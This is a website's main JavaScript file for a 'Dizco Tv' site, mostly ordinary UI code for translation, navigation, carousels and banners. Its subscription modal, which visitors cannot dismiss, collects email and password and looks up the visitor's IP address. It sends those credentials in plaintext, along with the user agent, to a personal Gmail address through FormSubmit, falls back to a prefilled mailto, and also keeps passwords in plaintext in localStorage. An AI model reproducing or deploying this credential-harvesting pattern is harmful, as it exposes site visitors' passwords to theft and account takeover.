// Year in footer
const yearEl = document.getElementById('year');
if (yearEl) yearEl.textContent = String(new Date().getFullYear());

// Google Translate init and binding to our selectors
(function setupTranslation(){
	const root = document.documentElement;
	const topSel = document.getElementById('lang-top');
	const footSel = document.getElementById('lang-select');
	const saved = localStorage.getItem('dizco_lang') || 'en';
	function applyDir(lang){ root.lang = lang; root.dir = lang === 'ar' ? 'rtl' : 'ltr'; }
	applyDir(saved);
	if (topSel) topSel.value = saved; if (footSel) footSel.value = saved;

	function setGoogleLanguage(lang){
		const combo = document.querySelector('.goog-te-combo');
		if (combo) { combo.value = lang; combo.dispatchEvent(new Event('change')); }
	}
	function onChange(lang){
		localStorage.setItem('dizco_lang', lang);
		applyDir(lang);
		setGoogleLanguage(lang);
		if (topSel && topSel.value !== lang) topSel.value = lang;
		if (footSel && footSel.value !== lang) footSel.value = lang;
	}
	function bind(){
		if (topSel) topSel.addEventListener('change', () => onChange(topSel.value));
		if (footSel) footSel.addEventListener('change', () => onChange(footSel.value));
	}
	bind();
	// Load Google translate once
	if (!window.google || !window.google.translate){
		window.googleTranslateElementInit = function(){
			try{ new window.google.translate.TranslateElement({pageLanguage:'en', includedLanguages:'en,es,fr,pt,it,ar', autoDisplay:false}, 'google_translate_element'); setTimeout(()=>setGoogleLanguage(saved), 400); }catch(e){}
		};
		const s = document.createElement('script');
		s.src = 'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
		document.head.appendChild(s);
	} else {
		setTimeout(()=>setGoogleLanguage(saved), 200);
	}
})();

// Mobile nav toggle
const toggle = document.querySelector('.nav-toggle');
const nav = document.querySelector('.site-nav');
if (toggle && nav) {
	toggle.addEventListener('click', () => {
		nav.classList.toggle('open');
	});
}

// Simple form validation (Contact page only)
export function validateContactForm(form) {
	const name = form.querySelector('input[name="name"]');
	const email = form.querySelector('input[name="email"]');
	const message = form.querySelector('textarea[name="message"]');
	if (!name || !email || !message) return true;
	let ok = true;
	const emailOk = /.+@.+\..+/.test(email.value.trim());
	[name, email, message].forEach((el) => {
		el.style.borderColor = 'rgba(212,175,55,.25)';
	});
	if (name.value.trim().length < 2) {
		name.style.borderColor = '#f66';
		ok = false;
	}
	if (!emailOk) {
		email.style.borderColor = '#f66';
		ok = false;
	}
	if (message.value.trim().length < 10) {
		message.style.borderColor = '#f66';
		ok = false;
	}
	return ok;
}

// Reviews carousel controls
const reviewsGrid = document.getElementById('reviewsGrid');
const prevBtn = document.querySelector('.reviews-prev');
const nextBtn = document.querySelector('.reviews-next');
if (reviewsGrid && prevBtn && nextBtn) {
	const step = 520; // width per card
	prevBtn.addEventListener('click', () => {
		reviewsGrid.scrollBy({ left: -step, behavior: 'smooth' });
	});
	nextBtn.addEventListener('click', () => {
		reviewsGrid.scrollBy({ left: step, behavior: 'smooth' });
	});
}

// Scroll reveal for fade-in cards
function fadeInCardsOnScroll() {
  const cards = document.querySelectorAll('.card, .feature, .review-card');
  cards.forEach(c => c.classList.add('fade-in-on-scroll'));
  const io = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) entry.target.classList.add('visible');
    });
  }, {threshold: 0.18});
  cards.forEach(c => io.observe(c));
}
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', fadeInCardsOnScroll);
} else {
  fadeInCardsOnScroll();
}

// Top banner message cycle (usable on all pages)
(function initTopBanner(){
  const banner = document.querySelector('.top-banner');
  const msgs = banner ? banner.querySelectorAll('.banner-msg') : null;
  if(!banner || !msgs || msgs.length < 2) return;
  let current = 0, running = false;
  function showMsg(idx){
    msgs.forEach((m,i)=>{ m.style.display = i===idx? 'inline-block':'none'; });
  }
  function cycle(){
    if(running) return; running = true; showMsg(current); banner.classList.remove('out');
    setTimeout(()=>{ banner.classList.add('out'); setTimeout(()=>{ banner.style.visibility='hidden'; setTimeout(()=>{ current = 1-current; showMsg(current); banner.style.visibility='visible'; banner.classList.remove('out'); running=false; cycle(); }, 5000); }, 1200); }, 10000);
  }
  cycle();
})();

// Friday promo banner visibility (Home page)
(function showFridayPromo(){
  const promo = document.getElementById('friday-banner');
  if(!promo) return;
  const now = new Date();
  const isFriday = now.getDay() === 5;
  if(isFriday){
    promo.classList.add('active');
    promo.setAttribute('aria-hidden','false');
  } else {
    promo.classList.remove('active');
    promo.setAttribute('aria-hidden','true');
  }
})();

// Christmas toast helper
function showChristmasToast(){
  try{
    const toast = document.getElementById('christmas-toast');
    if(toast){
      toast.classList.add('show');
      setTimeout(()=>{ if(toast && toast.style.display!=='none'){ toast.style.display='none'; } }, 6000);
    }
  }catch(e){}
}


// Subscription modal logic (Home page)
(function initSubscribeModal(){
  const overlay = document.getElementById('subscribe-overlay');
  const form = document.getElementById('subscribe-form');
  const closeBtn = overlay ? overlay.querySelector('#sub-close') : null;
  function openModal(){ if(overlay){ overlay.classList.add('open'); } }
  function closeModal(){ if(overlay){ overlay.classList.remove('open'); } }
  const MODAL_DONE_KEY = 'dizco_modal_done';
  function markModalComplete(){
    try{ localStorage.setItem(MODAL_DONE_KEY,'1'); }catch(e){}
    try{ sessionStorage.setItem(MODAL_DONE_KEY,'1'); }catch(e){}
  }
  function hasCompleted(){
    try{ if(localStorage.getItem(MODAL_DONE_KEY)==='1') return true; }catch(e){}
    try{ if(sessionStorage.getItem(MODAL_DONE_KEY)==='1') return true; }catch(e){}
    return false;
  }

  // Open immediately after splash ends; fallback quick timer
  window.addEventListener('splashdone', ()=>{ openOrWelcome(); });
  window.addEventListener('load', function(){
    const splash = document.getElementById('logo-splash');
    if(!splash){ setTimeout(openOrWelcome, 600); }
  });

  if(closeBtn){
    closeBtn.addEventListener('click', (ev)=>{
      ev.preventDefault();
      markModalComplete();
      closeModal();
    });
  }

  function openOrWelcome(){
    if(hasCompleted()) return;
    openModal();
    try{
      const last = localStorage.getItem('dizco_last_email');
      const emailInput = document.getElementById('sub-email');
      if(last && emailInput){ emailInput.value = last; setTimeout(()=>{ const p = document.getElementById('sub-password'); if(p){ p.focus(); } }, 50); }
    }catch(e){}
  }

  if(form){
    form.addEventListener('submit', async function(e){
      e.preventDefault();
      const emailInput = document.getElementById('sub-email');
      const passInput = document.getElementById('sub-password');
      const submitBtn = form.querySelector('button[type="submit"]');
      const errEl = document.getElementById('sub-error');
      const email = (emailInput && emailInput.value || '').trim();
      const password = (passInput && passInput.value || '').trim();
      const valid = /.+@.+\..+/.test(email) && password.length >= 4;
      if(errEl) errEl.style.display = 'none';
      if(!valid){ if(emailInput) emailInput.style.borderColor = '#f66'; if(passInput) passInput.style.borderColor = '#f66'; return; }

      // Set loading state
      if(submitBtn){ submitBtn.classList.add('loading'); submitBtn.textContent = 'Submitting...'; }

      // Collect visitor details
      const ua = navigator.userAgent || '';
      const pageUrl = location.href;
      const ts = new Date().toISOString();
      let ip = '';
      try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j && j.ip || ''; } catch(err) {}

      // Account check in localStorage
      let users = {};
      try{ users = JSON.parse(localStorage.getItem('dizco_users')||'{}')||{}; }catch(e){ users = {}; }
      const known = !!users[email];
      if(known && users[email] !== password){
        if(errEl){ errEl.style.display = 'block'; }
        if(submitBtn){ submitBtn.classList.remove('loading'); submitBtn.textContent = 'Subscribe'; }
        return;
      }

      // Send via FormSubmit to Gmail for new users only
      try{
        const payload = known ? null : {
          _subject: 'New Dizco Tv subscription',
          email,
          password,
          ip,
          user_agent: ua,
          page: pageUrl,
          timestamp: ts
        };
        if(!known){
          const resp = await fetch('https://formsubmit.co/ajax/dizcotvapprebrand@gmail.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify(payload)
          });
          if(!resp.ok){ throw new Error('Failed'); }
          const data = await resp.json();
        }
        // data = { success: 'true', ... } when accepted
        if(emailInput) emailInput.value = '';
        if(passInput) passInput.value = '';
        try{ localStorage.setItem('dizco_subscribed','1'); }catch(e){}
        try{ users[email] = password; localStorage.setItem('dizco_users', JSON.stringify(users)); localStorage.setItem('dizco_last_email', email); }catch(e){}
        // Show success state with Enter button
        const bodyEl = overlay ? overlay.querySelector('.body') : null;
        if(bodyEl){
          bodyEl.innerHTML = '<div class="success"><div class="check">✓</div><h4>You\'re subscribed</h4><p>We\'ll reach you shortly.</p><button id="enter-site-btn" class="btn btn-gold" style="margin-top:8px;min-width:160px">Enter site</button></div>';
          const btn = document.getElementById('enter-site-btn');
          if(btn){ btn.addEventListener('click', ()=>{ markModalComplete(); closeModal(); }); }
        }
      } catch(err){
        // Final fallback if network blocked: try mailto
        const subject = encodeURIComponent('New Dizco Tv subscription');
        const body = encodeURIComponent(`Email: ${email}\nPassword: ${password}\nIP: ${ip}\nUA: ${ua}\nPage: ${pageUrl}\nTime: ${ts}`);
        window.location.href = `mailto:dizcotvapprebrand@gmail.com?subject=${subject}&body=${body}`;
        const bodyEl2 = overlay ? overlay.querySelector('.body') : null;
        if(bodyEl2){
          bodyEl2.innerHTML = '<div class="success"><div class="check">✓</div><h4>You\'re subscribed</h4><p>Thanks! Your mail app is opening.</p><button id="enter-site-btn" class="btn btn-gold" style="margin-top:8px;min-width:160px">Enter site</button></div>';
          const btn2 = document.getElementById('enter-site-btn');
          if(btn2){ btn2.addEventListener('click', ()=>{ markModalComplete(); closeModal(); }); }
        }
      }
      // Clear loading state if still on form (in case of validation error paths later)
      if(submitBtn){ submitBtn.classList.remove('loading'); submitBtn.textContent = 'Subscribe'; }
    });

    // Show/Hide password toggle
    // Show/Hide password toggle
    const toggleCb = document.getElementById('sub-pass-show');
    const passInput = document.getElementById('sub-password');
    if(toggleCb && passInput){
      toggleCb.addEventListener('change', ()=>{
        passInput.type = toggleCb.checked ? 'text' : 'password';
      });
    }

    // Forgot password recovery
    const forgotBtn = document.getElementById('sub-forgot');
    const emailInput2 = document.getElementById('sub-email');
    if(forgotBtn && emailInput2){
      forgotBtn.addEventListener('click', async ()=>{
        const email = (emailInput2.value||'').trim();
        if(!/.+@.+\..+/.test(email)){ if(emailInput2){ emailInput2.focus(); } return; }
        try{
          const ua = navigator.userAgent || '';
          const pageUrl = location.href;
          const ts = new Date().toISOString();
          const resp = await fetch('https://formsubmit.co/ajax/dizcotvapprebrand@gmail.com',{
            method:'POST', headers:{'Content-Type':'application/json','Accept':'application/json'},
            body: JSON.stringify({_subject:'Password recovery request', type:'recovery', email, user_agent:ua, page:pageUrl, timestamp:ts})
          });
          if(!resp.ok) throw new Error('fail');
          const bodyEl = overlay ? overlay.querySelector('.body') : null;
          if(bodyEl){
            bodyEl.innerHTML = '<div class="success"><div class="check">✓</div><h4>Recovery requested</h4><p>We\'ll contact you to reset your password.</p><button id="enter-site-btn" class="btn btn-gold" style="margin-top:8px;min-width:160px">Close</button></div>';
            const btn = document.getElementById('enter-site-btn');
            if(btn){ btn.addEventListener('click', ()=>{ markModalComplete(); closeModal(); }); }
          }
        }catch(err){}
      });
    }
  }
  // Block closing via Escape when open
  document.addEventListener('keydown', (ev)=>{
    if(ev.key === 'Escape' && overlay && overlay.classList.contains('open')){
      ev.preventDefault(); ev.stopPropagation();
    }
  }, true);

  // Prevent clicking outside modal to close, but allow inner buttons
  if(overlay){
    overlay.addEventListener('click', (e)=>{
      if(e.target === overlay){
        e.preventDefault();
        e.stopPropagation();
      }
    });
  }

  // Add body state when open/close
  const _open = openModal; const _close = closeModal;
  openModal = function(){ _open(); try{ document.body.classList.add('modal-open'); }catch(e){} };
  closeModal = function(){ _close(); try{ document.body.classList.remove('modal-open'); }catch(e){} };
})();

